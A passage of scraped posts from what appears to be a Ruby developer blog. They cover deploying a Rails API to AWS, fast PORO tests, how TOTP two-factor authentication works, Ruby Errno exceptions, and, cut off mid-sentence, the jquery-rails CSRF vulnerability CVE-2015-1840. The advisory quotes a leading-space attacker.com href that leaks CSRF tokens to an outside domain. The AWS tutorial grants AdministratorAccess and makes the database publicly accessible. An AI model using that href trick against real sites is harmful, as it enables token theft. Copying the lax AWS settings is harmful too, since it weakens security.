framework you can choose to use is Rails (officially called Ruby on Rails ). Rails was created at Basecamp in 2003, and over the years, it has evolved into a full-featured and very mature framework that includes almost anything you can think of to build a modern web app. Some of the things you can build with rails include something as simple as a personal blog to something as complex as Airbnb and Github . I am sure you are familiar with these two companies, and yes, they do run on Rails! Although this article uses examples of deploying a Rails app to AWS, most of the main concepts remain the same regardless of the language and framework used, such as Python/Django or PHP/Laravel. Setting up Rails Note that the commands depicted will work on a UNIX/Linux-based system out of the box. If you are on Windows, consider using the Windows Subsystem for Linux and/or Microsoft Windows Terminal . For starters, verify your Ruby version: ruby -v Anything 2.5.0 and above is good to go. If not, go here to get the latest version. I have version 2.6.5 installed. If everything looks okay with your Ruby installation, go ahead and install Rails. gem install rails Once that command runs, confirm your Rails version: rails --version If you see anything above 6.0.0, then you're good to go for the rest of this tutorial. Setting up Postgres We will be using Postgres DB as our data store for this tutorial. Here is an excellent guide to installing it on any platform. Adding and Running Our Code We will build a simple API to store movie data, such as the name, year of release, and genre. The API will only have 2 endpoints, GET & POST, for demonstration purposes. Create a new Rails API app with the following command: rails new movie-api --api --database = postgresql Once the above command runs successfully, make sure to change the directory to the project folder created before running the next commands. Then, we can run the following command to generate our model: rails generate model Movie name:string year:integer genre:string Now let's set up the database and run migrations: rails db:setup rails db:migrate If these two commands are successful, you should be able to see a new migration in the db/migrate folder with code similar to the following: class CreateMovies < ActiveRecord :: Migration [ 6.0 ] def change create_table :movies do | t | t . string :name t . integer :year t . string :genre t . timestamps end end end We will then go ahead and add the controller logic code for our API endpoints: rails g controller api/Movies Then, add the following code to the file app/controllers/movies_controller.rb : class Api::MoviesController < ApplicationController # GET /movies def show @movies = Movie . all render json: @movies end # POST /movies def create @movie = Movie . new ( movie_params ) if @movie . save render json: @movie else render error: { error: 'Failed to add movie record' }, status: 400 end end private def movie_params params . require ( :movie ). permit ( :name , :year , :genre ) end end Let's set up the routes. This code goes into config/routes.rb. Rails . application . routes . draw do # For details on the DSL available within this file, see https://guides.rubyonrails.org/routing.html namespace :api do resource :movies end end At this point, you can run a sanity check using the rails routes command to verify that everything is working properly. You should see output containing something similar to the following: Before running our server, let's add some seed data to db/seeds.rb : # This file should contain all the record creation needed to seed the database with its default values. # The data can then be loaded with the Rails db:seed command (or created alongside the database with db:setup). movies = Movie . create ([ { name: 'Star Wars' , year: 1977 , genre: 'SCI-FI' }, { name: 'Lord of the Rings' , year: 2001 , genre: 'Fantasy' } ]) Run the following command to add the data to the DB: rails db:seed You can now run the API with the following command: rails s If you navigate to http://127.0.0.1:3000/api/movies, you should see our seed data: [ { \"id\" : 1 , \"name\" : \"Star Wars\" , \"year\" : 1977 , \"genre\" : \"SCI-FI\" , \"created_at\" : \"2020-01-01T10:04:56.100Z\" , \"updated_at\" : \"2020-01-01T10:04:56.100Z\" }, { \"id\" : 2 , \"name\" : \"Lord of the Rings\" , \"year\" : 2001 , \"genre\" : \"Fantasy\" , \"created_at\" : \"2020-01-01T10:04:56.108Z\" , \"updated_at\" : \"2020-01-01T10:04:56.108Z\" } ] Creating Your AWS Account For starters, go to this website . If you don't have an account yet, or you haven't signed into one from your browser, you should see a page similar to this: Go ahead and click the orange Create an AWS Account button on the top-right corner (or if you have an account, sign into your console). Once you have filled in the signup form (make sure to pick Account Type as Personal when filling in your address), you'll be dropped right into the console. Don't forget to verify your email address! Don't worry if things look overwhelming. The UI is quite simple to navigate once you know where you want to go. Set up an IAM User The next thing we need to do is set up an IAM user. This will give us access to API keys we can use to SSH and access our resources from outside AWS. It is also a good idea to have a separate IAM user with access to only the resources the user needs instead of using the default admin credentials for security purposes. On the home page, search for IAM and navigate to the IAM home page. On the IAM homepage, under IAM Resources, click on Users: 0. After that, click Add User. You can fill out the user name of your choice and then select the checkbox for Programmatic access. On the next screen, select Attach existing policies directly and then use the search box to search for AdministratorAccess. On the next page, add a name tag so you can identify your user later from the list of IAM credentials: Finally, on the review page, click on Create User. On the next page, download the CSV file using your credentials. We will need them for the last part. Once you have the file called credentials.csv, you can open it in any spreadsheet app or editor to see the values in it. We are mostly interested in Access key ID and Secret accesss key. The last thing you need to do is to go to your HOME folder and create a folder called .aws . Inside this folder, place a file called config. Notice that the folder name starts with a . and the file has no extension. The full path should be something like /Users/your-user/.aws/config. If you are unable to create the .aws folder and config file, you can skip it for now. The important thing is to have the CSV file with your credentials on hand for later use. Place the following into the config file: [profile eb-cli]\nregion = us-east-1\naws_access_key_id = your-aws-access-key-id\naws_secret_access_key = your-aws-secret-access-key You can find your AWS region on the top-right corner of the AWS account page when you sign in. Create RDS DB We will now go ahead and create the Postgres DB with which our app will be communicating. Similar to IAM, you can use the searchbox on the home page to search for RDS and navigate to it. On the home page of RDS, click on Create database. On the next page, select Standard Create ; then, under Engine Options, select PostgreSQL. As you continue scrolling, pick Free tier under Templates , and under Settings, let the DB instance identifier be movie-api. You can leave the Master username as postgres, but go ahead and add a password. Skip over the sections DB instance size, Storage, and Availability & durability. Under Connectivity, select Additional connectivity configuration and set Publicly accessible to Yes and VPC Security group to Create new. . Continue and skip over Database authentication. Under Additional configuration, make sure to add the Initial database name ; movie_api_db will do. Once set, skip everyting else and click Create Database at the bottom of the page. Lastly, back on the RDS dashboard, click on the default group under VPC Security groups on the right column: At the bottom of the next page, select Inbound and edit the rules to look as follows: Also, make sure the Outbound rules look like the following: Create Elasticbeanstalk App Navigate to the elastic beanstalk home page and click Create New Application. Fill out the new application form as necessary. You will then see a page with the message No environments currently exist for this application. Create one now. Click on Create one now. Next, select Web server environment. In the next section, change the Environment name to production-env. Leave the Domain blank. Then, under Base Configuration, select Preconfigured platform and choose Ruby from the dropdown. You can leave Application code on Sample application ; then, go ahead and click Create environment. This will take some time, so be patient. Once done, you should see a page that looks like this: Find the URL provided after the environment ID. Click on it to check out the default Ruby app on elasticbeanstalk. Very soon, your API will be running on the same URL. Make Your App Ready for Deployment To make the app ready for deployment, we need to first configure our web server. Since Rails ships with Puma, a production-ready web server, as its default server, you can directly edit the config file at config/puma.rb. Edit your file to look like the following: max_threads_count = ENV . fetch ( \"RAILS_MAX_THREADS\" ) { 5 } min_threads_count = ENV . fetch ( \"RAILS_MIN_THREADS\" ) { max_threads_count } threads min_threads_count , max_threads_count # Specifies the `port` that Puma will listen on to receive requests; default is 3000. # port ENV . fetch ( \"PORT\" ) { 3000 } # Specifies the `environment` that Puma will run in. # environment ENV . fetch ( \"RAILS_ENV\" ) { \"development\" } # Specifies the `pidfile` that Puma will use. pidfile ENV . fetch ( \"PIDFILE\" ) { \"tmp/pids/server.pid\" } # Specifies the number of `workers` to boot in clustered mode. # Workers are forked web server processes. If using threads and workers together, # the concurrency of the application would be max `threads` * `workers.` # Workers do not work on JRuby or Windows (both of which do not support # processes). # workers ENV . fetch ( \"WEB_CONCURRENCY\" ) { 2 } # <------ uncomment this line # Use the `preload_app!` method when specifying a `workers` number. # This directive tells Puma to first boot the application and load code # before forking the application. This takes advantage of Copy On Write # process behavior so workers use less memory. # preload_app! # <------ uncomment this line # Allow Puma to be restarted by the `Rails restart` command. plugin :tmp_restart Also, edit the bottom of config/database.yml by commenting out the existing production config and using this instead: production : url : <%= ENV['DATABASE_URL'] %> Lastly, go to your Elasticbeanstalk console on AWS, select the production-env environment, and then go to Configuration. On the configuration overview screen, click on Modify for the Software portion: . Next, add DATABASE_URL and RAILS_ENV , and then click on 'Apply': Note that your DB URL is built using the Endpoint you took note of earlier from the RDS dashboard. It is in the format of postgresql://postgres:YOURPASSWORD@ENDPOINT:5432/movie_api_db . If you do not remember the password you chose, you can change it in the Modify section of your DB's RDS dashboard. Manual Deployment This is as simple as creating a zip file of your app from the command line and then uploading it on your Elasticbeanstalk console. First of all, cd into the project folder. To create a zip file, you can then run the following command: zip -r deploy_1.zip . deploy_1.zip will be the name of the zip folder created, and it will appear in your project directory, along with the other files. Done? Excellent. On to AWS. From the Dashboard of Elasticbeanstalk, click on Upload and Deploy : You can change the version label to something more meaningful: Once Elasticbeanstalk has finished updating the environment, you can visit your environment URL to see your API running! You can use a free service, such as this , to send some requests and populate your DB on AWS. Deployment with EB CLI The Elasticbeanstalk CLI makes most of what you have had to do manually up to this point quite easy to accomplish with a few commands. I'll show you how to set it up and use it on our current project. This all depends on having your IAM user set up correctly, so make sure everything from that step is okay or that you have the CSV with your credentials ready. For most computers, you should already have Python installed. Installation will, therefore, be as easy as the following: pip install awsebcli --user On MacOS, you can also use: brew install awsebcli You can read more about installation here . Once the installation is finished, cd to your project folder and run eb init. Follow the prompts as per your AWS environment. Select a region by entering the correct number selection: Select a default region\n1 ) us-east-1 : US East ( N. Virginia ) 2 ) us-west-1 : US West ( N. California ) 3 ) us-west-2 : US West ( Oregon ) 4 ) eu-west-1 : EU ( Ireland ) 5 ) eu-central-1 : EU ( Frankfurt ) 6 ) ap-south-1 : Asia Pacific ( Mumbai ) 7 ) ap-southeast-1 : Asia Pacific ( Singapore ) 8 ) ap-southeast-2 : Asia Pacific ( Sydney ) 9 ) ap-northeast-1 : Asia Pacific ( Tokyo ) 10 ) ap-northeast-2 : Asia Pacific ( Seoul ) 11 ) sa-east-1 : South America ( Sao Paulo ) 12 ) cn-north-1 : China ( Beijing ) 13 ) cn-northwest-1 : China ( Ningxia ) 14 ) us-east-2 : US East ( Ohio ) 15 ) ca-central-1 : Canada ( Central ) 16 ) eu-west-2 : EU ( London ) 17 ) eu-west-3 : EU ( Paris ) For the Ruby version portion, select the relevant version using Puma: 1 ) Ruby 2.6 ( Passenger Standalone ) 2 ) Ruby 2.6 ( Puma ) 3 ) Ruby 2.5 ( Passenger Standalone ) 4 ) Ruby 2.5 ( Puma ) 5 ) Ruby 2.4 ( Passenger Standalone ) 6 ) Ruby 2.4 ( Puma ) 7 ) Ruby 2.3 ( Passenger Standalone ) 8 ) Ruby 2.3 ( Puma ) 9 ) Ruby 2.2 ( Passenger Standalone ) 10 ) Ruby 2.2 ( Puma ) 11 ) Ruby 2.1 ( Passenger Standalone ) 12 ) Ruby 2.1 ( Puma ) 13 ) Ruby 2.0 ( Passenger Standalone ) 14 ) Ruby 2.0 ( Puma ) 15 ) Ruby 1.9.3 I picked 2. Go through the rest of the prompts and select 'no' to using CodeCommit and 'no' to set up SSH. If you did not set up the AWS config, the CLI will prompt you for your AWS keys. Add them as required. Once this is done, the CLI will exit. You can then run commands, such as eb status, to check the status of the app we deployed. Environment details for : production-env\n  Application name: movie-api\n  Region: us-east-2\n  Deployed Version: Deploy 2-2\n  Environment ID: e-mab3kjy6pp\n  Platform: arn:aws:elasticbeanstalk:us-east-2::platform/Puma with Ruby 2.6 running on 64bit Amazon Linux/2.11.1\n  Tier: WebServer-Standard-1.0\n  CNAME: production-env.qnbznvpp2t.us-east-2.elasticbeanstalk.com\n  Updated: 2020-01-22 23:37:17.183000+00:00\n  Status: Ready\n  Health: Green To deploy a new version, simply run eb deploy. And, that's it! You can read more about other CLI commands you can try out here Summary In this tutorial, we have learned how to set up a simple Rails API, how to set up AWS resources, such as Elasticbeanstalk and RDS, and how to deploy the app to use them. We also covered how to use the Elasticbeanstalk CLI to automate deployments to our cloud app. You have now learned how to get from a working app on your local machine to a working app shared with the world on AWS.", "date": "2020-03-25"},
{"website": "Honey-Badger", "title": "Speed up Rails tests 10x by using PORO domain models", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/poro-plain-old-ruby-object-tests-and-specs/", "abstract": "If you're like most Rails developers I know (including myself), you're probably used to writing \"unit\" tests in RSpec that load up the whole Rails framework before each test, which takes a few seconds to do, even if you're only testing one tiny thing. This is of course annoying because it's hard to get into a flow state when you're always having to wait a few seconds to see the results of your test. What do you do during that few seconds? It's not a long enough time to work on something else, but it's too long to just idly sit there. No more slow tests One good way to get rid of the delayed-test-result problem is to separate your domain logic from your persistence logic, and then test your domain logic separately without loading Rails or doing database interation. This is much easier said than done. I hope to shed some light on the how in this post. An example What I'm going to do is show you a pretty simple Ruby class along with its tests, and then demonstrate how you might persist this class's objects to the database. My example will be incomplete because, perhaps like you, this way of testing is new to me and the path to doing this is not yet clear. Hopefully I'm metaphorically hacking away a few feet of trail and helping some people get a little further. The domain model The example I'll use is an Appointment class that knows how to calculate its own length based on the services for that appointment. Here's the class: class Appointment attr_accessor :start_time , :errors , :services def initialize @errors = [] @services = [] end def length @services . collect ( & :length_in_minutes ). inject ( 0 , : + ) end end Just ignore @errors part for now. I'll explain that later. Now here's the spec for the Appointment class: The spec # Notice the absence of \"require 'spec_helper'.\" We're only # including the file for the class we're wanting to test. require File . dirname ( __FILE__ ) + \"/../../app/models/appointment\" describe Appointment do before do @appointment = Appointment . new @appointment . start_time = \"2000-01-01 00:00:00\" end it \"can have services added to it\" do service = Object . new @appointment . services << service expect ( @appointment . services ). to eq ([ service ]) end describe \"#length\" do it \"is the sum of all its services' lengths\" do [ FIRST_SERVICE_LENGTH = 30 , SECOND_SERVICE_LENGTH = 45 ]. each do | length | @appointment . services << service_stub_with_length ( length ) end expect ( @appointment . length ). to eq ( FIRST_SERVICE_LENGTH + SECOND_SERVICE_LENGTH ) end it \"is 0 when there are no services\" do @appointment . services = [] expect ( @appointment . length ). to eq ( 0 ) end end def service_stub_with_length ( length ) service = double () service . stub ( :length_in_minutes ) { length } service end end There's also this other tiny class, Service : class Service attr_accessor :name , :price , :length_in_minutes end It of course does almost nothing. If you run the spec for Appointment , it takes barely any time at all. For me, if I put time around the command, it takes just over a second, and adding more tests doesn't make the whole test run meaningfully slower . You can have 10 or presumably 1000 tests like this and still see the results almost immediately. This allows you to get into and stay in a flow state. Here's what a view would look like It's neat that these classes I wrote can be tested quickly without loading Rails, but this whole example is kind of meaningless so far since you can't save anything to the database. Let's do that next. Here's a form that could be used to save a new appointment. Notice how it's just a form_tag and not a form_for : < %= form_tag(create_appointment_path) %>\n\n  <% if @appointment.errors.any? %>\n    <div id= \"error_explanation\" > < h2 >< %= pluralize(@appointment.errors.count, \"error\") %> prohibited this appointment from being saved:</h2>\n\n      <ul>\n      <% @appointment.errors.each do |msg| %>\n        <li><%= msg %></li> < % end %> < /ul>\n    </ div > < % end %> < div class = \"field\" > < %= datetime_field_tag :start_time, \"\", placeholder: \"Start Time\" %>\n  </div>\n\n  <%= submit_tag \"Create appointment\" %> < /form> And here's the controller class AppointmentsController < ApplicationController def index @appointments = Perpetuity [ Appointment ]. all end def new @appointment = Appointment . new end def create # Create a PORO from params @appointment = Appointment . new @appointment . start_time = params [ :start_time ] # Instantiate a validator for the appointment # (which itself is incidentally also a PORO) validator = AppointmentValidator . new ( @appointment ) # If @appointment is valid, save it using the # Perpetuity gem, an implementation of the Data # Mapper ORM pattern if validator . validate Perpetuity [ Appointment ]. insert ( @appointment ) redirect_to action: 'index' else @appointment . errors = validator . errors render action: 'new' end end private def prospective_user_params params . require ( :appointment ). permit ( :start_time ) end end In closing I don't think the details of how AppointmentValidator or Perpetuity work are necessarily terribly important to explain here. What I want to demonstrate is that POROs can be plugged into Rails in a way that's not necessarily totally awkward. I'm sure I'll start running into more challenges as I start separating domain layers from persistence layers more in production projects, but I think for now this is a pretty neat proof of concept.", "date": "2013-12-17"},
{"website": "Honey-Badger", "title": "Account Security Updates", "author": ["Kevin Webster"], "link": "https://www.honeybadger.io/blog/account-security-updates/", "abstract": "Have you wanted to throw away your expensive internet bill and use your neighbor's insecure wifi? Was the only thing holding you back the Honeybadger single-factor auth flow? Well, have I got news for you. Announcing: Two Factor Authentication (2FA) All kidding aside, we take security very seriously. We are thrilled to\nbe able to provide an important tool to help keep our users and their data more\nsecure. I figure I could just explain how to enable 2FA, but what's the fun in that? How about we take a light-hearted glimpse into the wild world of cryptography and figure out how 2FA works. If fun's not your thing, you can totally go straight to How to enable , my feelings won't be hurt. ⚠️ Warning: Some theory below Many 2FA implementations are built upon an algorithm called Time-Based One-Time Password ( TOTP ). Rolls right off the tongue. One-Time? Yes, the beauty in this method is that you are not transmitting the same \"password\" every time you log in. Using an authenticator application, a one-time \"password\" is generated and remains valid for a short duration (usually 30 seconds), which greatly dilutes the effectiveness of a malcolm-in-the-middle attack. Although there are some complicated bits, the overall implementation is relatively simple. The Secret A key point to understand about TOTP is that the server (verifier) and the authenticator (prover) must have a shared secret. This is the real \"password\", however it's only transmitted once (so I guess this is one-time as well)! The recommended way to consume the secret is via QR code. When you scan the QR code into your smartphone, the secret is encoded within a standard URI that looks something like this: otpauth :/ / totp / Honeybadger . io :inigo @honeybadger . io? secret = base32 - secret - key There are a few benefits to providing a QR code (as opposed to exposing the plaintext secret): Who has time to type in a 32 character code? Your authenticator app can provide helpful labels for your one-time password (referencing the email and issuer in the URI). This is especially useful when you use 2FA on multiple services. Finally a good reason to use a QR code! There are some additional (mostly ignored) parameters for the otpauth scheme, which you can view here . MAC and Me Once the secrets have been agreed upon 🤝, you will be asked (at some point) to provide a One-Time Password. This is where things get real . TOTP is built on top of another algorithm called HMAC-Based One-Time Password (HOTP) , which itself is based on Hash-based Message Authentication Code (HMAC) . It's all one big crypto onion. TOTP & HOTP are basically variations on what message gets hashed. HMAC is really where the magic happens. HMAC produces a digest, which is the output of running some value through a hashing algorithm . Let's see it in action with some ruby code: OpenSSL::HMAC.digest(\"SHA1\", \"my-secret-key\", \"the-earth-is-flat\")\n=> \"R\\xABp\\xCB\\xEC\\xFEJ\\r#\\x02\\xC8\\xAB\\x96\\xB68\\v\\xDA0\\xD7z\" Wow, look at that binary string! That's our Message Authentication Code (MAC) . We chose SHA1 as our hashing function (as does our implementation of TOTP ). There are many other functions to choose from, each with their own security and performance implications. What's radical about a hashing algorithm is that for any input , we will get the same output , every time! It will also produce a vastly different and unique output from any subtle input changes (ahem, depending on the hashing function , but don't worry we are not terribly concerned with collisions here). Okay, so it's called a Message Authentication Code because it can be used to prove that a received message is authentic. If you and I know the secret ( my-secret-key ), I can send you the message the-earth-is-flat along with the MAC . All you need to do is run the exact same digest function, with the same inputs, and if the MACs match up, you have authenticated the message! You know it wasn't tampered with and only could have come from me! 😎 Timecode So let's bring this back to TOTP . It's time to talk about time . You see, with TOTP , instead of digesting a preposterous message like the-earth-is-flat , we instead use a time step count (converted to a string) as the input. If you open your authenticator app, and watch when the codes get switched, you might notice a pattern. That's right, say it with me: \"They switch on the minute and the half minute\", very good. This makes calculating the message a little simpler. In this case we use the rounded down count of 30 seconds (the time step ) since the beginning of time (well, unix time). So, in ruby again: Time.now.to_i / 30\n=> 51772900 Ah hah! Thats our Message . So in our Authenticator app, we use our trusty digest function to get a new HMAC : hmac = OpenSSL::HMAC.digest(\"SHA1\", \"avwe8aw71j2boib23jkbjk32\", \"51772900\")\n=> \"H\\x7F\\xC1\\xACL\\xDA\\xDB\\xE7DQ\\x91kE\\x1C\\xE3,c\\nH\\xA0\"\nget_otp_code(hmac)\n=> \"332204\" The last step is to get the number code from this binary string. Since there is some bit manipulation required, I am going to hide behind our anonymous get_otp_code function for now. If you want, you can read about how it works in the HOTP Spec . When you submit the code to the server, it performs the exact same digest operation  and compares the codes. When they match, you're in! Because we are working with time, latency is a factor. There are strategies to account for possible delays. Understanding that will be your homework, if you want. That's the gist of how Time-Based One-Time Passwords work!! 🎉 Feel free to send me a thank you email after you use this info to be the life of your next dinner party! Implementation While I think it's important to understand how these things work, it's strongly discouraged to roll-your-own anything crypto related. One of the great things about the Ruby / Rails ecosystem is that you can often find a gem (sometimes many) to solve your problem. We use devise here at Honeybadger and there is a great devise plugin called two_factor_authentication . There are a few 2FA implementations to choose from, so here are some reasons we chose this one: Simple setup (a migration, some config & initializers sprinkled about) It allows for the One-Time code to be entered on its own page (after valid user/password) Acceptable defaults, yet simple to override It also has a max login attempts check, which is recommended by the spec How to enable Setup is simple: Navigate to the User Settings > Authentication page, select\n\"Set Up Two Factor Authentication\" and follow the directions to sync up the secret using Authy or Google Authenticator (or really any other TOTP app). That's it! Next time you login, we will prompt you for your authenticator code.\nFill it in and go with complete and utter peace of mind. 🧘 Security and simplicity? Can it get any better? One last thing: Pwned Password Check I've got a quick one for all you proponents of weak passwords. We also integrated with the devise-pwned_password gem. From now on, when you perform any operation that requires the password, we check to make sure the proposed password is not prevalent within any known data breaches. If you are adding a new password, and it fails the check, we won't allow it. If you aren't already, we highly recommend using a password manager ( 1Password ahem). One of the more interesting bits of Pwned Password is how your password stays secure even while checking against a database from a 3rd party service. It's called k-Anonymity and you can get an overview about it here . Well, that's all we have for now. Until next time! 👋", "date": "2019-03-26"},
{"website": "Honey-Badger", "title": "Understanding Ruby's strange \"Errno\" exceptions", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/understanding-rubys-strange-errno-exceptions/", "abstract": "If you've ever taken a look at Ruby's exception hierarchy , you may have noticed something weird. In addition to all of the normal exceptions like RuntimeError and NoMethodError, there's an odd reference to Errno::* . Exception StandardError ... SystemCallError Errno ::* ... If you've ever had the bad luck to write to disk when the disk is full, or to try to make an API call over a failing network then you've probably seen this type of error in action. You can trigger one right now by attempting to open a file that doesn't exist. irb> File.open ( \"badfilename.txt\" ) Errno::ENOENT: No such file or directory @ rb_sysopen - badfilename.txt\n    from ( irb ) :9:in ` initialize '\n    from (irb):9:in `open' from ( irb ) :9\n    from /Users/snhorne/.rbenv/versions/2.1.0/bin/irb:11:in ` <main> ' But what exactly are the Errono exceptions? And why are they treated differently thank other kinds of exceptions? Adapting Ruby to the OS The Errno exceptions are essentially an adapter. They connect operating system errors to Ruby's exception system. The operating system handles errors in a different way than Ruby does, so you have to have some kind of adapter. In ruby, errors tend to be reported as exceptions. But operating system errors are usually just integers. So ruby defines one exception class for each possible OS error. It then sticks all of these exceptions into a module called Errno. We can use IRB to see all of the exceptions in this module. And boy, are there a lot! irb > Errno . constants => [ :NOERROR , :EPERM , :ENOENT , :ESRCH , :EINTR , :EIO , :ENXIO , :E2BIG , :ENOEXEC , :EBADF , :ECHILD , :EAGAIN , :ENOMEM , :EACCES , :EFAULT , :ENOTBLK , :EBUSY , :EEXIST , :EXDEV , :ENODEV , :ENOTDIR , :EISDIR , :EINVAL , :ENFILE , :EMFILE , :ENOTTY , :ETXTBSY , :EFBIG , :ENOSPC , :ESPIPE , :EROFS , :EMLINK , :EPIPE , :EDOM , :ERANGE , :EDEADLK , :ENAMETOOLONG , :ENOLCK , :ENOSYS , :ENOTEMPTY , :ELOOP , :EWOULDBLOCK , :ENOMSG , :EIDRM , :ECHRNG , :EL2NSYNC , :EL3HLT , :EL3RST , :ELNRNG , :EUNATCH , :ENOCSI , :EL2HLT , :EBADE , :EBADR , :EXFULL , :ENOANO , :EBADRQC , :EBADSLT , :EDEADLOCK , :EBFONT , :ENOSTR , :ENODATA , :ETIME , :ENOSR , :ENONET , :ENOPKG , :EREMOTE , :ENOLINK , :EADV , :ESRMNT , :ECOMM , :EPROTO , :EMULTIHOP , :EDOTDOT , :EBADMSG , :EOVERFLOW , :ENOTUNIQ , :EBADFD , :EREMCHG , :ELIBACC , :ELIBBAD , :ELIBSCN , :ELIBMAX , :ELIBEXEC , :EILSEQ , :ERESTART , :ESTRPIPE , :EUSERS , :ENOTSOCK , :EDESTADDRREQ , :EMSGSIZE , :EPROTOTYPE , :ENOPROTOOPT , :EPROTONOSUPPORT , :ESOCKTNOSUPPORT , :EOPNOTSUPP , :EPFNOSUPPORT , :EAFNOSUPPORT , :EADDRINUSE , :EADDRNOTAVAIL , :ENETDOWN , :ENETUNREACH , :ENETRESET , :ECONNABORTED , :ECONNRESET , :ENOBUFS , :EISCONN , :ENOTCONN , :ESHUTDOWN , :ETOOMANYREFS , :ETIMEDOUT , :ECONNREFUSED , :EHOSTDOWN , :EHOSTUNREACH , :EALREADY , :EINPROGRESS , :ESTALE , :EUCLEAN , :ENOTNAM , :ENAVAIL , :EISNAM , :EREMOTEIO , :EDQUOT , :ECANCELED , :EKEYEXPIRED , :EKEYREJECTED , :EKEYREVOKED , :EMEDIUMTYPE , :ENOKEY , :ENOMEDIUM , :ENOTRECOVERABLE , :EOWNERDEAD , :ERFKILL , :EAUTH , :EBADRPC , :EDOOFUS , :EFTYPE , :ENEEDAUTH , :ENOATTR , :ENOTSUP , :EPROCLIM , :EPROCUNAVAIL , :EPROGMISMATCH , :EPROGUNAVAIL , :ERPCMISMATCH , :EIPSEC ] But why are they named so cryptically? I mean, how am I supposed to ever guess that ENOINT means \"File not found?\" ...There's actually a very simple answer. Copied wholesale from libc Whoever first built the Errno module  just copied the error names directly from libc. So ENOINT, in C, is the name of a macro which contains the integer error code that the OS returns when it can't find a file. So, to really find out what each of these does the trick is to look at the documentation for the C standard library. You can find a big list of them here . I've excerpted a few of the more relevant ones below: EPERM Operation not permitted; you can't access the file unless you have permission. ENOENT File or directory not found. EIO Input/output error; usually used for physical read or write errors. EBADF Bad file descriptor. You would get this error if you tried to write to a file you opened only for reading, for example. ECHILD You tried to manipulate a child process, but there aren't any child processes. ENOMEM You're out of RAM, and can't allocate any more virtual memory. EACCES Permission denied; the file permissions do not allow the attempted operation. ENOTBLK You tried to mount an ordinary file as a device, like a HDD. EBUSY Resource busy; a system resource that can’t be shared is already in use. For example, if you try to delete a file that is the root of a currently mounted filesystem, you get this error. EEXIST File exists; an existing file was specified in a context where it only makes sense to specify a new file. ENOTDIR A file that isn’t a directory was specified when a directory is required. EISDIR File is a directory; you cannot open a directory for writing, or create or remove hard links to it. EINVAL Invalid argument. This is used to indicate various kinds of problems with passing the wrong argument to a library function. EMFILE The current process has too many files open and can’t open any more. Duplicate descriptors do count toward this limit. EFBIG File too big; the size of a file would be larger than allowed by the system. ENOSPC No space left on device; write operation on a file failed because the disk is full. ESPIPE Invalid seek operation (such as on a pipe). EROFS An attempt was made to modify something on a read-only file system. EPIPE Broken pipe; there is no process reading from the other end of a pipe ENOTSOCK A file that isn’t a socket was specified when a socket is required. ENETUNREACH A socket operation failed because the subnet containing the remote host was unreachable. ENETRESET A network connection was reset because the remote host crashed. ECONNABORTED A network connection was aborted locally. ECONNRESET A network connection was closed for reasons outside the control of the local host, such as by the remote machine rebooting or an unrecoverable protocol violation. ENOBUFS The kernel’s buffers for I/O operations are all in use. In GNU, this error is always synonymous with ENOMEM; you may get one or the other from network operations. EISCONN You tried to connect a socket that is already connected. See Connecting. ENOTCONN The socket is not connected to anything. You get this error when you try to transmit data over a socket, without first specifying a destination for the data. EDESTADDRREQ No default destination address was set for the socket. You get this error when you try to transmit data over a connectionless socket, without first specifying a destination for the data with connect. ESHUTDOWN The socket has already been shut down. ETIMEDOUT A socket operation with a specified timeout received no response during the timeout period. ECONNREFUSED A remote host refused to allow the network connection (typically because it is not running the requested service). EHOSTDOWN The remote host for a requested network connection is down. EHOSTUNREACH The remote host for a requested network connection is not reachable. ENOTEMPTY Directory not empty, where an empty directory was expected. Typically, this error occurs when you are trying to delete a directory. EPROCLIM This means that the per-user limit on new process would be exceeded by an attempted fork. See Limits on Resources, for details on the RLIMIT_NPROC limit.", "date": "2015-07-22"},
{"website": "Honey-Badger", "title": "Announcing Uptime and Performance Metrics for Rails", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/uptime-monitoring-and-performance-metrics-for-rails-are-live/", "abstract": "Uptime and performance monitoring for ruby and rails applications Honeybadger now includes server monitoring! The more you understand the context of your errors, the faster you can fix them. That’s why we’ve added server monitoring to all accounts Medium and above. Use it on all your projects. No strings attached. No per-server fees. Why are we doing this? You have a lot of options for monitoring these days. A lot of them are more “powerful” than anything we’ll probably ever offer. But the truth is, when you’re fixing a bug, or checking the health of your app, you only need a few key metrics. Uptime Exceptions are cool and all, but it's really handy to know when your site is ACTUALLY DOWN. That's why we now offer external uptime monitoring. We'll ping a URL you provide every few minutes and make sure it's still up. If not, we'll alert you. Requests Per Minute See how busy your app is with requests per second. They’re broken down by request type and server. So you can see at a glance if you have a spike in a certain type of request such as forbidden. And you can see which host has the problem. Response Time Check app performance with time per request. This is broken down by type of request as well. So you can see if create requests are suddenly taking 10x longer, while GET requests have no change. Ram / Load System load and memory usage snapshots taken at the time of each error. This information can make the difference between fixing a bug in a few minutes instead of a few hours. We put this info right on the error page so you don’t have to go back and dig it out of other systems. Slow Controllers See which controllers & actions are slowest over a time period. Sometimes things are broken but they don’t thrown exceptions. They just slow down. Here we give you a simple way to see which actions may be problematic and fix problems before they get out of hand.", "date": "2013-10-23"},
{"website": "Honey-Badger", "title": "Understanding the rails-jquery CSRF vulnerability (CVE-2015-1840)", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/understanding-the-rails-jquery-csrf-vulnerability-cve-2015-1840/", "abstract": "If you're on the Ruby on Rails security mailing list , you saw several new vulnerability disclosures come through yesterday. One of these caught my attention because it had to do with a front-end library jquery-rails. I thought it might be fun to dig into this vulnerability and see how it ticks. First thing's first, if you use the jquery-rails gem or the jquery-ujs javascript library, go and upgrade to a patched version. These include  jquery-rails versions 4.0.4 and 3.1.3 and jquery-ujs 1.0.4. You can read the full vulnerability description here . I've also provided an excerpt below: There is an vulnerability in jquery-ujs and jquery-rails that can be used to bypass CSP protections and allows attackers to send CSRF tokens to attacker domains.\n\nThis vulnerability has been assigned the CVE identifier CVE-2015-1840.\n\nVersions Affected: All.\nNot affected: Applications which don't use jquery-ujs or jquery-rails.\nFixed Versions: jquery-rails versions 4.0.4 and 3.1.3 and jquery-ujs 1.0.4.\n\nImpact\n------\nIn the scenario where an attacker might be able to control the href attribute of an anchor tag or the action attribute of a form tag that will trigger a POST action, the attacker can set the href or action to \" https://attacker.com\" (note the leading space) that will be passed to JQuery, who will see this as a same origin request, and send the user's CSRF token to the attacker domain. The vulnerability exposes CSRF tokens There are a few major kinds of \"hacks\" that web applications are exposed to. One of these is called \"cross site request forgery.\" Here's how it works: A CSRF attack. Image from http://www.codeproject.com/KB/aspnet/556995/csrf3.jpg Supposed you're logged in to your bank's web app. As an evil 